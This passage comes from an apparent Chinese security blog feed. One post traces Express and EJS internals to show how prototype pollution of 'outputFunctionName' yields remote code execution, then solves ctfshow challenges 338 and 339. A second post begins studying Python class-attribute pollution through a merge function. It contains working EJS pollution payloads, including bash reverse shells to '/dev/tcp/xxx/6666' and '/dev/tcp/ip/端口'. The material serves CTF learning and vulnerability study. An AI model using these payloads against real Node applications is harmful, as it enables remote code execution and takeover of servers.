&#123;</span><br><span class="line">    renderOptions.cache = this.enabled(&#x27;view cache&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // primed cache</span><br><span class="line">  if (renderOptions.cache) &#123;</span><br><span class="line">    view = cache[name];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // view</span><br><span class="line">  if (!view) &#123;</span><br><span class="line">    var View = this.get(&#x27;view&#x27;);</span><br><span class="line"></span><br><span class="line">    view = new View(name, &#123;</span><br><span class="line">      defaultEngine: this.get(&#x27;view engine&#x27;),</span><br><span class="line">      root: this.get(&#x27;views&#x27;),</span><br><span class="line">      engines: engines</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    if (!view.path) &#123;</span><br><span class="line">      var dirs = Array.isArray(view.root) &amp;&amp; view.root.length &gt; 1</span><br><span class="line">        ? &#x27;directories &quot;&#x27; + view.root.slice(0, -1).join(&#x27;&quot;, &quot;&#x27;) + &#x27;&quot; or &quot;&#x27; + view.root[view.root.length - 1] + &#x27;&quot;&#x27;</span><br><span class="line">        : &#x27;directory &quot;&#x27; + view.root + &#x27;&quot;&#x27;</span><br><span class="line">      var err = new Error(&#x27;Failed to lookup view &quot;&#x27; + name + &#x27;&quot; in views &#x27; + dirs);</span><br><span class="line">      err.view = view;</span><br><span class="line">      return done(err);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // prime the cache</span><br><span class="line">    if (renderOptions.cache) &#123;</span><br><span class="line">      cache[name] = view;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // render</span><br><span class="line">  tryRender(view, renderOptions, done);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710154103094.png"
                      alt="image-20230710154103094"
                ></p>
<p>进入app.render，发现最终会进入到tryRender:</p>
<p>继续跟进：</p>
<ul>
<li>node_modules&#x2F;express&#x2F;lib&#x2F;application.js</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710154244173.png"
                      alt="image-20230710154244173"
                ></p>
<p>该函数接受三个参数：</p>
<ul>
<li><code>view</code>：表示要渲染的视图对象。</li>
<li><code>options</code>：可选的选项参数，用于向视图传递数据。</li>
<li><code>callback</code>：回调函数，用于处理渲染结果或错误。</li>
</ul>
<p>函数的实现如下：</p>
<ol>
<li>在 <code>try</code> 代码块中，调用 <code>view.render(options, callback)</code> 来尝试渲染视图。这会将选项参数和回调函数传递给视图对象进行渲染。</li>
<li>如果渲染过程中没有抛出错误，执行正常的渲染操作，并将结果通过回调函数传递出去。</li>
<li>如果在 <code>try</code> 代码块中抛出了错误（比如视图渲染函数内部抛出异常），则 <code>catch</code> 代码块会捕获到该错误。</li>
<li>在 <code>catch</code> 代码块中，调用 <code>callback(err)</code>，将捕获到的错误作为参数传递给回调函数进行处理。</li>
</ol>
<p>这里继续跟进view.render方法：</p>
<ul>
<li><p>node_modules&#x2F;express&#x2F;lib&#x2F;view.js</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710155808784.png"
                      alt="image-20230710155808784"
                ></p>
</li>
</ul>
<p>​	到这里调用了engine，从这里进入到了模板引擎ejs.js中</p>
<p>这里继续跟进ejs.js的renderFile方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710160156305.png"
                      alt="image-20230710160156305"
                ></p>
<p>我们可以在最好发现又调用了tryHandleCache方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710160230167.png"
                      alt="image-20230710160230167"
                ></p>
<p>继续跟进：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710160310520.png"
                      alt="image-20230710160310520"
                ></p>
<p>进入到 handleCache 方法，跟进 handleCache：</p>
<ul>
<li>node_modules&#x2F;ejs&#x2F;ejs.js</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710160345175.png"
                      alt="image-20230710160345175"
                ></p>
<p>我们在hadleCache中找到了渲染模板的compile方法</p>
<p>跟进</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230710160744167.png"
                      alt="image-20230710160744167"
                ></p>
<p>在这里我们找到了outputFunctionName</p>
<p>而且在这里我们可以看到又大量拼接</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (!this.source) &#123;</span><br><span class="line">     this.generateSource();</span><br><span class="line">     prepended += &#x27;  var __output = [], __append = __output.push.bind(__output);&#x27; + &#x27;\n&#x27;;</span><br><span class="line">     if (opts.outputFunctionName) &#123;</span><br><span class="line">       prepended += &#x27;  var &#x27; + opts.outputFunctionName + &#x27; = __append;&#x27; + &#x27;\n&#x27;;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></div>

<p>有代码我们可以看到这里opts.outputFunctionName被拼接到prepended中</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#125;</span><br><span class="line">     appended += &#x27;  return __output.join(&quot;&quot;);&#x27; + &#x27;\n&#x27;;</span><br><span class="line">     this.source = prepended + this.source + appended;</span><br></pre></td></tr></table></figure></div>

<p>而拼接完的prepended最好被传入到this.source中</p>
<p>并被带入函数执行，所以如果我们能够污染 <code>opts.outputFunctionName</code>，就能将我们构造的 payload 拼接进 js 语句中，并在 ejs 渲染时进行 RCE。在 ejs 中还有一个 <code>render</code> 方法，其最终也是进入了compile</p>
<p>ejs 模板引擎 RCE 常用的 POC：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).execSync(&#x27;calc&#x27;);var __tmp2&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(&#x27;calc&#x27;);var __tmp2&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="7、例题"><a href="#7、例题" class="headerlink" title="7、例题"></a>7、例题</h4><h5 id="ctfshow338"><a href="#ctfshow338" class="headerlink" title="ctfshow338"></a>ctfshow338</h5><p>login.js</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var router = express.Router();</span><br><span class="line">var utils = require(&#x27;../utils/common&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* GET home page.  */</span><br><span class="line">router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;</span><br><span class="line">  res.type(&#x27;html&#x27;);</span><br><span class="line">  var flag=&#x27;flag_here&#x27;;</span><br><span class="line">  var secert = &#123;&#125;;</span><br><span class="line">  var sess = req.session;</span><br><span class="line">  let user = &#123;&#125;;</span><br><span class="line">  utils.copy(user,req.body);</span><br><span class="line">  if(secert.ctfshow===&#x27;36dboy&#x27;)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;+JSON.stringify(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">module.exports = router;</span><br></pre></td></tr></table></figure></div>

<p>可以看到当secret.ctfshow&#x3D;&#x3D;&#x3D;’36dboy’时会输出flag</p>
<p>那么这里就是很明显的原型链污染</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">utils.copy(user,req.body);</span><br></pre></td></tr></table></figure></div>

<p>然后copy是在common.js中定义的</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">  copy:copy</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function copy(object1, object2)&#123;</span><br><span class="line">    for (let key in object2) &#123;</span><br><span class="line">        if (key in object2 &amp;&amp; key in object1) &#123;</span><br><span class="line">            copy(object1[key], object2[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>看到这个代码就很熟悉了，这就是上面我们分析的merge函数进行原型链污染</p>
<p>这个copy函数和merge的功能是相同的</p>
<p>直接把上面我们分析的paylaod改改直接就可以打：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;ctfshow&quot;:&quot; 36dboy&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230707205610256.png"
                      alt="image-20230707205610256"
                ></p>
<p>直接拿上面的payload改改参数就行</p>
<p>或：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230707205621032.png"
                      alt="image-20230707205621032"
                ></p>
<p>具体怎么实现的，就不再分析了，本质和上面我们分析的merge函数一个道理。</p>
<h5 id="ctfshow339"><a href="#ctfshow339" class="headerlink" title="ctfshow339"></a>ctfshow339</h5><p>和上面几乎差不多</p>
<p>但是获取flag的条件变了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var router = express.Router();</span><br><span class="line">var utils = require(&#x27;../utils/common&#x27;);</span><br><span class="line"></span><br><span class="line">function User()&#123;</span><br><span class="line">  this.username=&#x27;&#x27;;</span><br><span class="line">  this.password=&#x27;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">function normalUser()&#123;</span><br><span class="line">  this.user</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* GET home page.  */</span><br><span class="line">router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;</span><br><span class="line">  res.type(&#x27;html&#x27;);</span><br><span class="line">  var flag=&#x27;flag_here&#x27;;</span><br><span class="line">  var secert = &#123;&#125;;</span><br><span class="line">  var sess = req.session;</span><br><span class="line">  let user = &#123;&#125;;</span><br><span class="line">  utils.copy(user,req.body);</span><br><span class="line">  if(secert.ctfshow===flag)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;+JSON.stringify(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">module.exports = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>而且多了一个api.js</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var router = express.Router();</span><br><span class="line">var utils = require(&#x27;../utils/common&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* GET home page.  */</span><br><span class="line">router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;</span><br><span class="line">  res.type(&#x27;html&#x27;);</span><br><span class="line">  res.render(&#x27;api&#x27;, &#123; query: Function(query)(query)&#125;);</span><br><span class="line">   </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">module.exports = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>由login.js我们可以看到</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">secert.ctfshow===flag</span><br></pre></td></tr></table></figure></div>

<p>但是这明显时不可能的，那我们就要换一个思路了</p>
<p>看api.js</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">res.render(&#x27;api&#x27;, &#123; query: Function(query)(query)&#125;);</span><br></pre></td></tr></table></figure></div>

<p><code>res.render</code> 是一个常见的函数调用，用于渲染视图并将其发送给客户端。<code>&#39;api&#39;</code> 是要渲染的视图模板的名称，而 <code>&#123; query: Function(query)(query) &#125;</code> 是要传递给视图模板的数据对象。Function(query)创建一个新的函数，并使用传递的字符串 <code>query</code> 作为函数体。然后，该新函数立即被调用，传递了 <code>query</code> 作为参数。函数的返回值将作为 <code>&#123; query: ... &#125;</code> 数据对象中 <code>query</code> 属性的值。</p>
<p>这里的参数名和函数体的字符串内容是一致的，因此实际上相当于是将query字符串解析成了一个函数并立即执行这个函数，返回值作为整个语句的结果。那我们去覆盖query进行命令执行，而且res.render在渲染视图模板的时候，会生成一个响应里面有参数传给客户端，然后我们这里第二参数是query，那么他就会自动去Object寻找值并返回。所以我们只要让Object.prototype下面的query的值为我们想要执行命令就可以了，这里我们可以通过login.js中的copy方法来执行。</p>
<p>payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/端口 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">global.process 是 Node.js 中的全局对象 process。</span><br><span class="line">mainModule 是 process 对象的一个属性，它表示主模块，即应用程序的入口文件。</span><br><span class="line">constructor 是主模块的构造函数。</span><br><span class="line">_load(&#x27;child_process&#x27;) 是调用主模块构造函数的 _load 方法，并传递 &#x27;child_process&#x27; 作为参数。child_process 是 Node.js 内置模块，用于创建和管理子进程。</span><br><span class="line">.exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/端口 0&gt;&amp;1\&#x27;) 是调用 child_process 模块的 exec</span><br></pre></td></tr></table></figure></div>

]]></content>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>关于python原型链污染的一次学习记录</title>
    <url>/2023/07/14/%E5%85%B3%E4%BA%8Epython%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E4%B8%80%E6%AC%A1%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h3 id="一、python原型链污染"><a href="#一、python原型链污染" class="headerlink" title="一、python原型链污染"></a>一、python原型链污染</h3><p>本篇文章只是记录自己对python原型链污染的一个学习记录和复现，大部分都是参考和学习这位师傅的文章，并没有什么创新，只是作为自己学习的一个记录，感兴趣的师傅可以去看一下这篇文章：</p>
<p><a class="link"   href="https://tttang.com/archive/1876/#comment-12403" >https://tttang.com/archive/1876/#comment-12403 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<p>在前面我们学习了javascript的原型链污染，但是在ciscn2023华中赛区中出了一道python原型链污染的题目，所以这里对python原型链污染进行学习。</p>
<h4 id="一、javascript中的megre函数"><a href="#一、javascript中的megre函数" class="headerlink" title="一、javascript中的megre函数"></a>一、javascript中的megre函数</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过我们前面对javscript的原型链污染的学习我们可以知道</p>
<p>这里通过</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">target[key] = source[key]</span><br></pre></td></tr></table></figure></div>

<p>实现原型链污染</p>
<p>这里就向上篇文章我们学习的那个例子一样:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">      </span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;    </span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = JSON.parse(&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;)</span><br><span class="line">merge(o1, o2)</span><br><span class="line">console.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230713173130534.png"
                      alt="image-20230713173130534"
                ></p>
<p>分析代码可以看到if里面就是一个递归，else里面就是我们最终要使用的合并函数</p>
<p>我们打一点输出</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">         console.log(key)</span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            console.log(&quot;11111111111&quot;)</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        </span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            console.log(key)</span><br><span class="line">            console.log(&quot;===========================&quot;)</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = JSON.parse(&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;)</span><br><span class="line">merge(o1, o2)</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230713173922191.png"
                      alt="image-20230713173922191"
                ></p>
<p>我这里将每次循环的key值都打印出来了</p>
<p><strong>第一次循环</strong></p>
<p>第一次key&#x3D;a. ,o1里面没有a，所以进入else</p>
<p>执行：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">target[a] = source[a]</span><br></pre></td></tr></table></figure></div>

<p><strong>第二次循环</strong></p>
<p>key&#x3D;<em>proto</em>,通过我们前面的学习我们知道所有引用类型（函数，数组，对象）都拥有<code>__proto__</code>属性，那么对于target和source都拥有__proto__属性 所以这里会执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">merge(target[key], source[key])</span><br><span class="line">即执行：</span><br><span class="line">merge(target[__proto__], source[__proto__])</span><br><span class="line">01:&#123;&#125;</span><br><span class="line">   01[__proto__]=[Object: null prototype] &#123;&#125;</span><br><span class="line">02:&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;</span><br><span class="line">   02[__proto__]=&#123;&quot;b&quot;: 2&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>第三次循环：</strong></p>
<p>key&#x3D;b</p>
<p>这里至于source里面有b属性，所以直接进入else</p>
<p>即执行：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">target[key] = source[key]</span><br><span class="line">#object[b]=source[b]即2</span><br></pre></td></tr></table></figure></div>

<p>但是这里的target&#x3D;object</p>
<p>那我们执行这个就等于向object里面添加了一个b属性，就实现了原型链污染。</p>
<p>通过javascript的原型链污染学习，我们知道这是javascript原型链污染中的一种重要方式，但是在python中也可以通过这种攻击方式实现对类属性值的污染。</p>
<p>但是与javascript相比python的原型链污染条件太过苛刻，所以在看到大佬的文章中称之为python原型链污染变体，与javascript不同的是并不是所有的类和属性都是可以被污染的，污染只对类的属性起作用，对于类方法是无效的。</p>
<h4 id="二、python中的merge合并函数"><a href="#二、python中的merge合并函数" class="headerlink" title="二、python中的merge合并函数"></a>二、python中的merge合并函数</h4><p>为什么说python的原型链污染比较苛刻呢，因为他像javascript中的merge函数的原型链污染的应用一样同样需要一个数值合并函数将特定值污染到类的属性中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br></pre></td></tr></table></figure></div>

<p>其实可以看到实现的功能和我们javascript中实现功能是类似的</p>
<p>下面我们通过一个污染示例来对学习这个函数是怎么进行污染的。</p>
<p>但是在分析示例代码前</p>
<p>我们要知道在python中类可以继承父类的属性和方法，当一个类从另一个类继承时，会获得父类的所有方法和属性，并且可以使用它们</p>
<p>但是当在子类中声明与父类同名的属性时，子类的属性会覆盖父类的同名属性</p>
<ul>
<li>类中声明的属性是类的共享属性，所有实例将共享同一个属性。</li>
<li>以双下划线（__）开头的属性是类的特殊属性，它们在类的内部使用，并且在所有实例中都是唯一的。</li>
</ul>
<h4 id="三、python中的原型链污染"><a href="#三、python中的原型链污染" class="headerlink" title="三、python中的原型链污染"></a>三、python中的原型链污染</h4><p>这里借用大佬文章代码进行分析：</p>
<h5 id="修改自定义属性"><a href="#修改自定义属性" class="headerlink" title="修改自定义属性"></a>修改自定义属性</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">class father:</span><br><span class="line">    secret = &quot;haha&quot;</span><br><span class="line"></span><br><span class="line">class son_a(father):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class son_b(father):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):#判读dst里面是否存在__getitem__</span><br><span class="line">            if dst.get(k) and type(v) == dict:#判断dst中是否存在k键,存在返回对应键值而且判断v的类型是否是一个字典</span><br><span class="line">                merge(v, dst.get(k))      #递归运行merge，src=v,dst=dst.get(k)</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v   #若dst里面不存在k键则添加到dst里面</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:#判断dst里面是否存在k，并且判断v的类型是否是一个字典</span><br><span class="line">            merge(v, getattr(dst, k))  #执行merge递归，src=v,dst=getattr(dst,k)</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)#设置对象 dst 中属性名为 k 的属性值为 v。</span><br><span class="line"></span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__class__&quot; : &#123;</span><br><span class="line">        &quot;__base__&quot; : &#123;</span><br><span class="line">            &quot;secret&quot; : &quot;no way&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(son_a.secret)</span><br><span class="line">#haha</span><br><span class="line">print(instance.secret)</span><br><span class="line">#haha</span><br><span class="line">merge(payload, instance)</span><br><span class="line">print(son_a.secret)</span><br><span class="line">#no way</span><br><span class="line">print(instance.secret)</span><br><span class="line">#no way</span><br></pre></td></tr></table></figure></div>

<p>我们这里在merge(payload, instance)打上断点，调试分析一下污染的过程：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714082428059.png"
                      alt="image-20230714082428059"
                ></p>
<p>初始变量：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714082455597.png"
                      alt="image-20230714082455597"
                ></p>
<p>这里的instance是我们son_b的一个实例化对象，python中当直接打印一个对象时，Python会默认调用对象的<code>__str__</code>方法或<code>__repr__</code>方法来生成表示该对象的字符串。</p>
<ul>
<li><code>&lt;</code> 和 <code>&gt;</code>：表示这是一个对象的开始和结束。</li>
<li><code>__main__.son_b</code>：<code>__main__</code> 表示当前模块是主程序模块，而 <code>son_b</code> 表示对象所属的类名。</li>
<li><code>object</code>：表示该对象是从内置类 <code>object</code> 继承而来的。</li>
</ul>
<p>​      最后一部分 <code>0x000001D202236770</code> 是对象在内存中的地址，以十六进制表示。</p>
<p><code>&lt;__main__.son_b object at 0x000001D202236770&gt;</code> 的含义是当前模块中的 <code>son_b</code> 类的一个对象，位于内存地址 <code>0x000001D202236770</code>。</p>
<p>步入：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714082754866.png"
                      alt="image-20230714082754866"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714082803399.png"
                      alt="image-20230714082803399"
                ></p>
<p>这里的src和dst分别是我们传入的payload和instance</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714082910410.png"
                      alt="image-20230714082910410"
                ></p>
<p>  src.items()</p>
<p><code>src.items()</code> 是一个字典（<code>src</code>）的方法调用，用于返回字典中所有键值对的视图对象。这个方法返回一个类似于列表的可迭代对象，其中包含了字典中所有的键值对。</p>
<p>这里取出了k和v的值</p>
<p>这里的k和v的值就是paylaod里面的键值和键名</p>
<p>然后这里会对dst进行一个判断,根据我们代码中的分析：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714083456432.png"
                      alt="image-20230714083456432"
                ></p>
<p>这里会进入到merge(v,getattr(dst,k))进行递归</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714084337894.png"
                      alt="image-20230714084337894"
                ></p>
<p>getattr(dst,k)用于获取对象 <code>dst</code> 中属性名为 <code>k</code> 的属性的值。</p>
<p>继续步入：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714084518672.png"
                      alt="image-20230714084518672"
                ></p>
<p>src&#x3D;{‘<strong>base</strong>‘: {‘secret’: ‘no way’}}    dst&#x3D;&lt;class ‘__main__.son_b’&gt;</p>
<p>继续跟进</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714084732600.png"
                      alt="image-20230714084732600"
                ></p>
<p>这里的k&#x3D;__base v&#x3D;{‘secret’:’no way’}</p>
<p>经过判断后还是执行了递归</p>
<p>继续跟进</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714085059308.png"
                      alt="image-20230714085059308"
                > </p>
<p>经过再一次递归</p>
